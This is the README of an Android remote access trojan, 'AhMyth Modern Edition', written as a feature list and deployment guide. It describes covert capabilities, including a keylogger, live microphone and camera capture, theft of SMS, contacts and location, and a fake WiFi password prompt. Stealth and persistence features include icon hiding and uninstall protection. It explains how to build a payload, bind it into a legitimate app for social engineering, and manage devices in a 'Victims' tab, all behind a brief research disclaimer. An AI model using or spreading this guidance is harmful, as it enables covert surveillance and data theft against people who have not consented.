# AhMyth Android RAT - Modern Edition

**Advanced Remote Administration Tool for Android Security Research & Forensic Analysis**

[![Version](https://img.shields.io/badge/version-2.6.0-blue.svg)](https://github.com/syrex1013/AhMyth)
[![Android](https://img.shields.io/badge/Android-5.0%20--%2014%2B-green.svg)](https://developer.android.com/about/dashboards)
[![License](https://img.shields.io/badge/license-GPL--3.0-yellow.svg)](LICENSE.md)
[![Socket.IO](https://img.shields.io/badge/Socket.IO-4.8.1-brightgreen.svg)](https://socket.io/)
[![Electron](https://img.shields.io/badge/Electron-Latest-blue.svg)](https://www.electronjs.org/)

---

## ⚠️ Legal Disclaimer

**THIS SOFTWARE IS PROVIDED FOR EDUCATIONAL AND SECURITY RESEARCH PURPOSES ONLY.**

The authors and contributors of AhMyth are not responsible for any misuse of this software. Using this tool on devices you do not own or have explicit permission to test is **illegal** and punishable by law. By downloading or using this software, you agree to take full responsibility for your actions.

**Intended Use Cases:**
- Security research and penetration testing (with proper authorization)
- Educational purposes in cybersecurity courses
- Testing your own devices
- Forensic analysis with legal authorization
- Security awareness and training

---

## 📖 Overview

AhMyth is a powerful, open-source Remote Administration Tool (RAT) designed for controlling and monitoring Android devices. This "Modern Edition" has been significantly overhauled to support the latest Android security standards (Android 5.0 through Android 14+), featuring advanced stealth capabilities, robust connection handling, comprehensive forensic tools, and a modern Electron-based GUI.

### What Makes This Edition Special?

- **Modern Android Support:** Fully compatible with Android 5.0 through Android 14+, bypassing modern background restrictions and security features
- **Stealth Mode 2.0:** Utilizes transparent overlay services to maintain foreground priority without alerting users
- **Comprehensive Forensic Suite:** Advanced data extraction and monitoring capabilities
- **Professional GUI:** Modern Electron-based interface with real-time monitoring and control
- **Robust Architecture:** Upgraded to latest Socket.IO for stable, persistent connections with automatic recovery
- **One-Click Deployment:** Automated build, install, and permission granting via ADB

---

## 🚀 Key Features

### 📷 Surveillance & Media Control

#### Camera Control
- **Front/Back Camera Capture:** Capture high-quality photos from both cameras
- **Foreground Service Overlay:** Auto-bypass background restrictions using transparent overlay
- **MDM Bypass:** Fallback to screen capture if camera policy is strict
- **Foreground/Background Control:** Programmatically bring app to foreground for camera access

#### Live Microphone Streaming
- **Real-Time Audio Streaming:** Stream audio from device microphone in real-time
- **Raw PCM16 Audio:** High-quality audio capture with proper encoding
- **Live Transcription:** Real-time speech-to-text using Web Speech API
- **Recording Management:** Record, save, and manage audio streams with metadata
- **Transcription History:** Track and review transcription sessions

#### Screen Mirroring & Remote Control
- **Real-Time Screen Streaming:** View device screen with configurable quality and framerate
- **Interactive Remote Desktop:** Full touch control, gestures, and keyboard input
- **Fullscreen Mode:** Dedicated fullscreen window with live updates and input forwarding
- **Screen Lock Prevention:** Wake lock to prevent screen from locking during streaming
- **Permission Persistence:** Remembers MediaProjection token to avoid repeated permission requests
- **Coordinate Accuracy:** Precise click/tap coordinate mapping with aspect ratio handling

### 🕵️ Forensic & Data Extraction

#### File Manager
- **Full Filesystem Access:** Browse, download, upload, and delete files
- **Chunked Transfer:** Efficient handling of large files (50MB+ limit with chunked reading)
- **Memory Management:** Automatic memory checks and optimization
- **Path Navigation:** Easy navigation through device filesystem
- **Media File Support:** Special handling for images, videos, and documents

#### SMS Manager
- **Inbox & Sent Messages:** Read all SMS messages (inbox and sent)
- **Send SMS:** Send text messages to any phone number
- **Conversation View:** Chat-like interface for viewing SMS conversations
- **Message Filtering:** Filter messages by phone number or contact

#### Call Logs
- **Complete Call History:** Retrieve all incoming, outgoing, and missed calls
- **Call Details:** Duration, timestamps, phone numbers, and call types
- **Export Capability:** Export call logs for analysis

#### Contacts
- **Full Contact List:** Export complete contact database
- **Contact Details:** Names, phone numbers, emails, and additional metadata
- **VCF Export:** Export contacts in standard VCF format

#### Location Tracking
- **GPS Location:** Precise GPS coordinates with accuracy information
- **Network Location:** Network-based location as fallback
- **Location History:** Track location changes over time
- **Map Integration:** Visual location tracking on interactive maps

#### Browser History
- **History Extraction:** Retrieve complete browser history
- **Bookmarks:** Extract saved bookmarks
- **Search History:** Access search queries and visited URLs
- **Timestamps:** Full timestamp information for all entries

#### Accounts & Authentication
- **Account Enumeration:** List all logged-in accounts (Google, WhatsApp, Facebook, etc.)
- **Account Types:** Identify account types and providers
- **Account Details:** Extract account names and associated services

#### Clipboard Monitoring
- **Real-Time Monitoring:** Monitor clipboard changes in real-time
- **Clipboard Cache:** Caching mechanism for Android 10+ background restrictions
- **Foreground Access:** Automatic foreground activation for clipboard access
- **Content Capture:** Capture text, images, and other clipboard content

#### WiFi Information
- **Network Scanning:** Scan and list available WiFi networks
- **Current Connection:** Display currently connected WiFi network
- **Network Details:** SSID, BSSID, signal strength, encryption type
- **Password Extraction:** Extract saved WiFi passwords (requires root)
- **Phishing Simulation:** WiFi password prompt dialog for security testing

#### Notifications
- **Notification Monitoring:** Real-time notification capture and monitoring
- **Notification History:** View all captured notifications
- **Notification Details:** App name, title, content, timestamps
- **Notification Listener:** Background service for continuous monitoring

### 🛡️ Stealth & Persistence

#### App Hiding
- **Icon Hiding:** Hide app icon from launcher (configurable)
- **Hide from Recents:** Remove app from recent apps list
- **No Launcher Entry:** Transparent main activity with no launcher icon

#### Service Persistence
- **Auto-Restart:** Automatic service restart on boot and crash
- **Foreground Service:** Runs as persistent foreground service
- **Silent Notifications:** Configurable silent notification to prevent system killing
- **Wake Lock:** Prevent device from sleeping (configurable)
- **MIUI Support:** Special handling for MIUI's aggressive process management

#### Uninstall Protection
- **Device Admin:** Device administrator privileges for uninstall protection
- **Admin Receiver:** Automatic re-enablement if disabled
- **Protection Persistence:** Maintains protection across reboots

#### Background Operation
- **Foreground Priority:** Maintains foreground priority using overlay service
- **Battery Optimization:** Request ignore battery optimizations
- **Autostart Permission:** Request autostart permission (MIUI and other custom ROMs)
- **Background Data:** Maintains connection even when app is in background

### 🛠️ System Information & Monitoring

#### Device Information
- **Hardware Details:** Model, manufacturer, brand, device name
- **Software Information:** Android version, API level, build number
- **Screen Information:** Resolution, density, orientation
- **Network Information:** IP address, MAC address, network type
- **Battery Status:** Level, charging status, health, temperature

#### System Forensics
- **CPU Usage:** Real-time CPU usage monitoring with fallback methods
- **Memory Information:** Runtime memory, max memory, available memory
- **Process List:** Running processes with details (PID, UID, importance)
- **Network Statistics:** Data usage (WiFi, mobile, per-app)
- **App Usage Stats:** Application usage statistics (requires usage access permission)
- **SIM Card Information:** SIM details, carrier information, IMEI
- **Accounts List:** All device accounts with types and details

#### Keylogger
- **Keystroke Capture:** Capture keyboard input from all applications
- **Window Monitoring:** Track active windows and applications
- **Notification Capture:** Capture notification content
- **Log Management:** View, export, and clear keylogger logs
- **Real-Time Monitoring:** Live keylogger data streaming

### 🎮 Remote Control

#### Input Injection
- **Touch Control:** Tap, swipe, long press gestures
- **Keyboard Input:** Text input and key events
- **Navigation Keys:** Home, Back, Recents, Power buttons
- **Volume Control:** Volume up/down with multiple fallback methods
- **Enter Key:** Enter key injection with alternative methods
- **Coordinate Mapping:** Accurate coordinate translation for different screen sizes

#### Screen Control
- **Screen Wake:** Wake up device and unlock screen
- **Screen Capture:** Single screenshot capture
- **Screen Streaming:** Continuous screen streaming with configurable quality
- **Fullscreen Mode:** Dedicated fullscreen window for screen sharing

### 📞 Communication

#### Phone Calls
- **Make Calls:** Initiate phone calls to any number
- **Call Management:** End calls, mute, speaker control
- **Call Logs:** Complete call history with details

---

## 🏗️ Architecture

### Client-Server Model

```
┌─────────────────┐         Socket.IO          ┌─────────────────┐
│  Android Client  │ ◄─────────────────────────► │  Electron Server │
│   (AhMyth-Client)│         (WebSocket)         │  (AhMyth-Server) │
└─────────────────┘                              └─────────────────┘
         │                                               │
         │                                               │
    ┌────▼────┐                                    ┌────▼────┐
    │ Services │                                    │   GUI   │
    │ Activities│                                    │  Tabs   │
    │ Managers │                                    │ Logs    │
    └──────────┘                                    └─────────┘
```

### Key Components

#### Android Client (`AhMyth-Client`)
- **MainService:** Persistent foreground service for background operation
- **ConnectionManager:** Handles all socket communication and command routing
- **ScreenStreamService:** Manages screen capture and streaming
- **InputManager:** Handles remote input injection (touch, keys, gestures)
- **Forensic Managers:** Specialized managers for data extraction (CameraManager, FileManager, etc.)

#### Electron Server (`AhMyth-Server`)
- **Main Process:** Socket.IO server, window management, IPC handling
- **Renderer Process:** AngularJS-based GUI with multiple controllers
- **Lab Controller:** Main controller for device interaction tabs
- **Test Suite:** Comprehensive automated testing framework

---

## 📦 Installation

### Prerequisites

- **Java 11+** (Required for APK building and signing)
- **Node.js 16+** or **Bun 1.0+** (Bun is recommended for better performance)
- **ADB** (Android Debug Bridge) - Must be added to system PATH
- **Android SDK** (For building APKs - Gradle will download automatically)
- **Git** (For cloning the repository)

### Step 1: Clone the Repository

```bash
git clone https://github.com/syrex1013/AhMyth.git
cd AhMyth
```

### Step 2: Install Dependencies

#### Using Bun (Recommended)

```bash
# Install Bun if not already installed
# Visit: https://bun.sh

# Install server dependencies
cd AhMyth-Server
bun install

# Install app dependencies
cd app
bun install
```

#### Using npm

```bash
# Install server dependencies
cd AhMyth-Server
npm install

# Install app dependencies
cd app
npm install
```

### Step 3: Verify ADB Installation

```bash
# Check if ADB is in PATH
adb version

# If not installed, download Android Platform Tools:
# https://developer.android.com/studio/releases/platform-tools
```

### Step 4: Start the Server

```bash
# From project root
cd AhMyth-Server
bun start

# OR using npm
npm start
```

The Electron GUI will launch automatically.

---

## 🎮 Usage Guide

### Building a Payload

1. **Open the APK Builder Tab** in the Electron GUI
2. **Configure Connection:**
   - Enter your **Public IP** (for remote access) or **Local IP** (for LAN testing)
   - Set **Port** (default: 1234)
   - Ensure port is open in firewall if using public IP
3. **Select Permissions:**
   - Choose required permissions based on features you need
   - Recommended: Camera, Microphone, Location, Storage, Phone, SMS
4. **Configure Stealth Options:**
   - Hide app icon (optional)
   - Hide from recents (recommended)
   - Persistent service (recommended)
   - Wake lock (for continuous operation)
   - Uninstall protection (advanced)
5. **Build APK:**
   - Click **Build APK**
   - Wait for build to complete (output in `AhMyth-Server/app/Factory/Output/`)
6. **Optional - Bind APK:**
   - Click **Bind APK** to merge payload with a legitimate app
   - Useful for social engineering scenarios

### Deploying to Device

#### Method 1: Automatic (ADB) - Recommended

1. **Enable USB Debugging** on target device:
   - Settings → About Phone → Tap "Build Number" 7 times
   - Settings → Developer Options → Enable "USB Debugging"
2. **Connect Device via USB**
3. **Verify Connection:**
   ```bash
   adb devices
   ```
4. **In GUI Builder Tab:**
   - Click **Install & Run**
   - This will automatically:
     - Install the APK
     - Grant permissions via ADB (where possible)
     - Start the application
     - Open permission dialogs for user approval

#### Method 2: Manual Installation

1. **Transfer APK** to device (USB, email, cloud storage, etc.)
2. **Install APK:**
   - Enable "Install from Unknown Sources" if prompted
   - Open APK file and install
3. **Grant Permissions:**
   - App will request permissions on first launch
   - Some permissions require manual approval in Settings

### Connecting to Server

1. **Start the Server** (if not already running)
2. **Open Victims Tab** in GUI
3. **Wait for Connection:**
   - Device will automatically connect when app is launched
   - Connection status shown with country flag and device info
4. **Open Lab:**
   - Click **"Open Lab"** button next to connected device
   - This opens the control panel with all available features

### Using Features

#### Camera Control
1. Navigate to **Camera** tab in Lab view
2. Select camera (Front/Back)
3. Click **Capture** to take photo
4. Use **Foreground/Background** buttons if camera access fails
5. Click **Save** to download photo

#### Screen Sharing
1. Navigate to **Remote Desktop** tab
2. Click **Request Permission** (first time only)
3. Tap **"Start Now"** on device when prompted
4. Click **Stream** to start live screen sharing
5. **Interact with Device:**
   - Click on screen to tap
   - Drag to swipe
   - Use navigation buttons (Home, Back, Recents)
   - Use volume/enter keys
   - Type text in input field
6. **Fullscreen Mode:** Click **Fullscreen** button for dedicated window

#### Live Microphone
1. Navigate to **Live Microphone** tab
2. Click **Start Streaming** to begin audio capture
3. **Enable Transcription:** Toggle transcription for real-time speech-to-text
4. **Record Stream:** Click record to save current stream
5. **View Recordings:** Access saved recordings in table below
6. **Play/Delete:** Manage recorded streams

#### File Manager
1. Navigate to **File Manager** tab
2. **Browse Files:** Click folders to navigate
3. **Download File:** Click download icon next to file
4. **Delete File:** Click delete icon (with confirmation)
5. **Upload File:** Use upload button (if implemented)

#### SMS Manager
1. Navigate to **SMS Manager** tab
2. **View Messages:** Inbox tab shows all messages
3. **Send SMS:** 
   - Go to Send tab
   - Enter phone number and message
   - Click Send
4. **View Conversation:** Click on message or "Open Conversation" button

#### Other Features
- **Location:** Real-time GPS tracking with map view
- **Contacts:** Export full contact list
- **Call Logs:** View complete call history
- **Keylogger:** Monitor keyboard input
- **Clipboard:** Monitor clipboard changes
- **System Info:** Detailed device and system information
- **Apps:** List installed apps, install/uninstall apps

---

## 🔧 Advanced Configuration

### Server Configuration

#### Change Default Port

Edit `AhMyth-Server/app/main.js`:
```javascript
const PORT = 1234; // Change to desired port
```

#### Custom Build Settings

Edit `AhMyth-Server/app/app/assets/js/controllers/AppCtrl.js` for default build options.

### Client Configuration

#### Stealth Settings

Edit `AhMyth-Client/app/src/main/java/ahmyth/mine/king/ahmyth/StealthConfig.java`:
```java
public static final boolean HIDE_APP_ICON = true;
public static final boolean HIDE_FROM_RECENTS = true;
public static final boolean PERSISTENT_SERVICE = true;
// ... other settings
```

#### Connection Settings

Server IP and port are embedded during APK build. Rebuild APK to change connection settings.

### Permission Granting

#### Automated Permission Granting (ADB)

The test suite and installer automatically grant permissions via ADB:
- Runtime permissions (Camera, Microphone, Location, etc.)
- Special permissions (Overlay, Battery Optimization, etc.)
- Device Admin (for uninstall protection)
- Notification Listener
- Accessibility Service
- Usage Stats (for app usage monitoring)

#### Manual Permission Granting

Some permissions require manual user approval:
- **Overlay Permission:** Settings → Apps → Special Access → Display over other apps
- **Battery Optimization:** Settings → Apps → Battery → Don't optimize
- **Autostart (MIUI):** Security → Autostart → Enable for app
- **Usage Access:** Settings → Apps → Special Access → Usage access

---

## 🧪 Testing

### Comprehensive Test Suite

Run the automated test suite to verify all features:

```bash
# Run comprehensive test suite
node test-comprehensive-suite.js

# Run only failing tests (faster debugging)
node test-comprehensive-suite.js --only-failing

# Run specific test category
node test-comprehensive-suite.js --category "Camera"
```

### Test Suite Features

- **Automated Build:** Builds APK automatically
- **ADB Integration:** Installs and grants permissions
- **Feature Testing:** Tests all RAT functions
- **Stealth Verification:** Verifies stealth features work correctly
- **Error Reporting:** Detailed error messages and logs
- **GUI Integration:** Test suite available in Electron GUI

### Manual Testing

1. **Build and Install** APK on test device
2. **Grant Permissions** manually or via ADB
3. **Connect to Server** and verify connection
4. **Test Each Feature** individually through GUI
5. **Check Logs** in Activity Log panel for errors

---

## 📊 Technical Specifications

### Android Client

- **Minimum SDK:** Android 5.0 (API 21)
- **Target SDK:** Android 14 (API 34)
- **Build Tool:** Gradle 7.5+
- **Language:** Java 8+
- **Architecture:** Service-based with foreground priority

### Electron Server

- **Framework:** Electron (Latest)
- **Frontend:** AngularJS 1.8.3
- **Backend:** Node.js/Bun with Socket.IO 4.8.1
- **UI Framework:** Semantic UI / Fomantic UI
- **Database:** SQLite (for logging)

### Network Protocol

- **Protocol:** WebSocket (via Socket.IO)
- **Default Port:** 1234
- **Connection:** Persistent with automatic reconnection
- **Encryption:** Not included (add TLS/SSL for production use)

### Supported Android Versions

| Version | API Level | Status | Notes |
|---------|-----------|--------|-------|
| Android 5.0 (Lollipop) | 21 | ✅ Supported | Legacy camera API |
| Android 6.0 (Marshmallow) | 23 | ✅ Supported | Runtime permissions |
| Android 7.0 (Nougat) | 24 | ✅ Supported | Multi-window support |
| Android 8.0 (Oreo) | 26 | ✅ Supported | Background limits |
| Android 9.0 (Pie) | 28 | ✅ Supported | Privacy features |
| Android 10 (Q) | 29 | ✅ Supported | Scoped storage |
| Android 11 (R) | 30 | ✅ Supported | Background location |
| Android 12 (S) | 31 | ✅ Supported | Microphone indicators |
| Android 13 (T) | 33 | ✅ Supported | Notification permissions |
| Android 14 (U) | 34 | ✅ Supported | Foreground service types |

---

## 🐛 Troubleshooting

### Common Issues

#### Device Not Connecting

**Problem:** Device doesn't appear in Victims tab

**Solutions:**
- Verify server is running and port is accessible
- Check firewall settings (port 1234 must be open)
- Ensure device has internet connection
- Verify APK was built with correct IP/port
- Check device logs: `adb logcat | grep AhMyth`

#### Camera Not Working

**Problem:** Camera capture fails or returns black image

**Solutions:**
- Grant camera permission manually in Settings
- Use "Bring to Foreground" button before capturing
- Check if another app is using camera
- Verify camera is not blocked by MDM policy

#### Screen Streaming Permission Denied

**Problem:** Screen streaming always asks for permission

**Solutions:**
- Tap "Start Now" when permission dialog appears
- Grant "Display over other apps" permission
- Restart the app after granting permissions
- Check if MediaProjection service is running

#### Clipboard Always Empty

**Problem:** Clipboard returns empty even when content exists

**Solutions:**
- Android 10+ requires app to be in foreground
- Use "Bring to Foreground" before reading clipboard
- Enable clipboard monitoring for automatic capture
- Check if clipboard access is restricted by device policy

#### Key Injection Not Working

**Problem:** Volume/Enter/Navigation keys don't work

**Solutions:**
- Grant accessibility service permission
- Enable "Display over other apps" permission
- Try bringing app to foreground first
- Check device logs for error messages
- Some keys may require root access

#### File Download Fails

**Problem:** Large file downloads timeout or crash

**Solutions:**
- Files over 50MB are automatically chunked
- Check available memory on device
- Verify file permissions (read access)
- Try downloading smaller files first

### Debugging

#### Enable Debug Logging

**Android Client:**
```bash
adb logcat | grep AhMyth
```

**Electron Server:**
- Check Activity Log panel in GUI
- Check Logs tab for request/response logs
- Open DevTools: View → Toggle Developer Tools

#### Common Log Patterns

- **Connection Issues:** Look for "socket.io" or "connection" in logs
- **Permission Errors:** Look for "Permission denied" or "SecurityException"
- **Service Errors:** Look for "Service" or "ForegroundService" errors

---

## 🔒 Security Considerations

### For Security Researchers

- **Use in Isolated Environment:** Always test in isolated network
- **Encrypt Communications:** Add TLS/SSL for production use
- **Secure Server:** Use firewall rules and authentication
- **Data Protection:** Encrypt sensitive data at rest
- **Access Control:** Implement authentication for server access

### For End Users

- **Be Aware:** This tool can be used maliciously
- **Device Security:** Keep Android updated, use security apps
- **Permission Awareness:** Review app permissions carefully
- **Network Monitoring:** Monitor network traffic for suspicious activity

---

## 🤝 Contributing

Contributions are welcome! Please follow these guidelines:

### Contribution Process

1. **Fork the Repository**
2. **Create Feature Branch:** `git checkout -b feature/amazing-feature`
3. **Make Changes:** Follow code style and add tests
4. **Test Thoroughly:** Test on multiple Android versions if possible
5. **Commit Changes:** Use descriptive commit messages
6. **Push to Branch:** `git push origin feature/amazing-feature`
7. **Open Pull Request:** Provide detailed description of changes

### Code Style

- **Java:** Follow Android coding standards
- **JavaScript:** Use ES6+ features, follow existing patterns
- **Comments:** Add comments for complex logic
- **Documentation:** Update README and CHANGELOG for new features

### Testing Requirements

- Test on at least Android 10 and Android 14
- Verify backward compatibility with older Android versions
- Test all affected features
- Check for memory leaks and performance issues

---

## 📄 License

This project is licensed under the **GNU General Public License v3.0**.

See the [LICENSE.md](LICENSE.md) file for the full license text.

**Key Points:**
- ✅ Free to use, modify, and distribute
- ✅ Must include original license
- ✅ Modifications must be open source
- ❌ Cannot be used in proprietary software
- ❌ No warranty provided

---

## 📚 Additional Resources

### Documentation

- [CHANGELOG.md](CHANGELOG.md) - Detailed version history
- [LICENSE.md](LICENSE.md) - Full license text
- [Test Suite Documentation](test-comprehensive-suite.js) - Automated testing guide

### Related Projects

- [Original AhMyth](https://github.com/AhMyth/AhMyth-Android-RAT) - Original project
- [Socket.IO Documentation](https://socket.io/docs/) - Communication protocol
- [Android Developer Guide](https://developer.android.com/) - Android development resources

### Support

- **Issues:** Report bugs and request features via GitHub Issues
- **Discussions:** Use GitHub Discussions for questions
- **Security:** Report security vulnerabilities privately

---

## 🎯 Roadmap

### Planned Features

- [ ] End-to-end encryption for communications
- [ ] Multi-device management dashboard
- [ ] Advanced stealth techniques
- [ ] Cloud storage integration
- [ ] Automated report generation
- [ ] Mobile app for server management
- [ ] Advanced keylogger with screenshot capture
- [ ] Real-time location tracking with geofencing
- [ ] Advanced file manager with search
- [ ] Command execution via shell

### Known Limitations

- Some features require root access (WiFi passwords, advanced key injection)
- Clipboard access on Android 10+ requires foreground
- Screen streaming requires user permission each session
- Large file transfers may be slow on slow networks
- Some custom ROMs (MIUI, ColorOS) have additional restrictions

---

## 👤 Author & Maintainer

### Adrian (syrex1013)

**GitHub:** [@syrex1013](https://github.com/syrex1013)  
**Email:** remix3030303@hotmail.com

**About:**
Adrian is a cybersecurity researcher and Android security specialist with extensive experience in mobile security, penetration testing, and forensic analysis. This modern edition of AhMyth represents a comprehensive overhaul of the original project, adding support for the latest Android versions, advanced stealth capabilities, and a professional GUI interface.

**Contributions:**
- Complete modernization of AhMyth for Android 10-14+
- Advanced stealth mode implementation
- Comprehensive forensic tool suite
- Professional Electron GUI
- Automated testing framework
- Extensive bug fixes and improvements

**Specializations:**
- Android Security Research
- Mobile Penetration Testing
- Reverse Engineering
- Malware Analysis
- Digital Forensics

---

## 🙏 Acknowledgments

- **Original AhMyth Team** - For the foundational work
- **Open Source Community** - For tools and libraries used
- **Contributors** - For bug reports, suggestions, and improvements
- **Security Researchers** - For feedback and testing

---

## 📞 Contact & Support

For questions, issues, or contributions:

- **GitHub Issues:** [Create an issue](https://github.com/syrex1013/AhMyth/issues)
- **Email:** remix3030303@hotmail.com
- **Repository:** [https://github.com/syrex1013/AhMyth](https://github.com/syrex1013/AhMyth)

---

**⭐ If you find this project useful, please consider giving it a star on GitHub!**

---

*Last Updated: January 2025*  
*Version: 2.6.0*
